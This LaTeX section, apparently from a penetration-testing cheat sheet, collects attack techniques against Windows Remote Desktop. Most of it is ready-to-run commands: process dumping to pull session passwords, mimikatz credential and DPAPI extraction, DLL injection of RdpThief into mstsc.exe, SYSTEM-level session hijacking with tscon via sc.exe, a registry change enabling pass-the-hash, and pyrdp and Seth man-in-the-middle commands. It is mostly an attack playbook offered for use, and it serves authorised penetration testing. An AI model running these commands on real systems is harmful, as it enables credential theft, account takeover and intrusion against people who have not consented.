
\section{Attacks}
\input{network/rdp/bruteforce}

\subsection{Dumping active Session Password}

\subsubsection{Manual}
\begin{verbatim}
# find termService pid
netstat -nob | Select-String TermService -Context 1

# dump the process
procdump64.exe -ma <PID> -accepteula C:\Users\pentestlab

# search for password
strings -el svchost* | grep Password123 -C3
\end{verbatim}

\subsubsection{mimikatz}
\begin{verbatim}
privilege::debug
ts::logonpasswords
\end{verbatim}

\subsection{mstsc cleat text passwords}

\subsubsection{mimikatz}
\begin{verbatim}
privilege::debug
ts::mstsc
\end{verbatim}

\subsubsection{SharpRDP}
The \verb+mstsc.exe+ process is created when a user opens the remote desktop connection application in order to connect to other systems via the RDP protocol. API hooking could be used to intercept the credentials provided by the user and use them for lateral movement. 

RdpThief which attempts to hook the functions used by mstsc process (CredIsMarshaledCredentialW \& CryptProtectMemory) in order to retrieve the credentials and write them into a file on the disk.

From a system that has been compromised and the mstsc.exe is running the DLL needs to be injected into the process.
\begin{verbatim}
SimpleInjector.exe mstsc.exe RdpThief.dll
\end{verbatim}


\href{https://github.com/passthehashbrowns/SharpRDPThief}{SharpRDPThief} can also be used


\subsection{Saved credentials}
RDP saved credentials are stored in an encrypted form in the Credential Manager of Windows by using the DPAPI

The location of the Windows Credentials on the disk is the following:
\begin{verbatim}
C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials
\end{verbatim}

The file can be viewed through the Mimikatz in order to identify the master key GUID:
\begin{verbatim}
dpapi::cred /in:C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\<GUID>
\end{verbatim}

access the \verb+guidMasterKey+:
\begin{verbatim}
sekurlsa::dpapi
\end{verbatim}

then decrypt de data:
\begin{verbatim}
dpapi::cred /in:C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\<GUID>
/masterkey:<MASTER_KEY>
\end{verbatim}

Executing the following command will provide the details in which server these credentials belong.
\begin{verbatim}
vault::list
\end{verbatim}



\subsection{Session Hijacking}
To successfully impersonate a user without their password, we need to have
\verb+SYSTEM+ privileges and use the Microsoft
\href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon}{tscon.exe} binary that enables users to connect to another desktop session.

\begin{verbatim}
# get sessions names
query user 

tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
\end{verbatim}


With \verb+local administrator+ privileges, there are several methods to obtain
\verb+SYSTEM+ privileges, such as
\href{https://docs.microsoft.com/en-us/sysinternals/downloads/psexec}{PsExec}
or \href{https://github.com/gentilkiwi/mimikatz}{Mimikatz}. A simple trick is
to create a Windows service using
\href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create}{Microsoft
sc.exe} that, by default, will run as Local System and will execute any binary with SYSTEM privileges. 

\begin{verbatim}
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
net start sessionhijack
\end{verbatim}
Once the service is started, a new terminal with the lewen user session will appear.


\subsection{Pass the hash}
In order to pass the hash restricted admin must be enabled
\begin{verbatim}
reg add HKLM\System\CurrentControlSet\Control\Lsa
    /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
\end{verbatim}

Once the registry key is added, we can use xfreerdp with the option /pth to
gain RDP access.

\subsection{Pass the ticket}
\href{https://www.pentestpartners.com/security-blog/abusing-rdps-remote-credential-guard-with-rubeus-ptt/}{Remote Credential Guard Pass-the-ticket}

\subsection{mitm}

\href{https://github.com/SySS-Research/Seth/blob/master/doc/paper/Attacking_RDP-Paper.pdf}{Attacking RDP Paper}

\subsubsection{pyrdp-mitm}

\href{https://github.com/GoSecure/pyrdp}{https://github.com/GoSecure/pyrdp}
\begin{verbatim}
pyrdp-mitm.py <IP>
pyrdp-mitp.py <IP>:<PORT> # with custom port
pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # with custom key and certificate
\end{verbatim}


exploitation:
\begin{itemize}
    \item 
        If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge
    \item 
        If NLA is disabled, you will obtain the password in plaintext
\end{itemize}

\subsubsection{Seth}

performs ARP spoofing prior to launching the RDP listener

For more info see \href{https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/rdp-mitm}{RDP MiTM}


\href{https://github.com/SySS-Research/Seth}{Seth} is a tool written in Python and Bash to MitM RDP connections by attempting to downgrade the connection in order to extract clear text credentials. It was developed to raise awareness and educate about the importance of properly configured RDP connections in the context of pentests, workshops or talks. The author is Adrian Vollmer (SySS GmbH).

\begin{verbatim}
sudo ./seth.sh <interface> <Attacker-IP> <RDP-SOURCE-IP> <RDP-TARGET-IP>
\end{verbatim}

if pivoting need to reverse forward the \verb+3389+ port

\subsection{RDPInception}

If a user access via RDP into a machine where an attacker is waiting for him, the attacker will be able to inject a beacon in the RDP session of the user and if the victim mounted his drive when accessing via RDP, the attacker could access it.

In this case you could just compromise the victims original computer by writing a backdoor in the statup folder.
